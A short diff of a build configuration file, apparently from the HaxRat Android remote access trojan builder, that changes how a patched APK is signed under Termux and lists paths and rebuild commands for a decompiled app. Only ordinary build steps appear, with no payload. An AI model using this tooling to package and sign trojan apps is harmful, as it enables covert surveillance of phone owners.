@@ -23,7 +23,7 @@ exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/hax4us/haxrat/IOSocket.smali');
 
 exports.termuxBuildCommand = 'apkmod' + ' -r "' + exports.smaliPath + '" -o "' + exports.termuxApkBuildPath + '"';
-exports.termuxSignCommand = 'apksigner -p android keystore "' + exports.termuxApkBuildPath + '" "' + exports.termuxApkSignedBuildPath + '"' ;
+exports.termuxSignCommand = 'apkmod -s "' + exports.termuxApkBuildPath + '"' + ' -o ' + '"' + exports.termuxApkSignedBuildPath + '"' ;
 
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
 exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; 
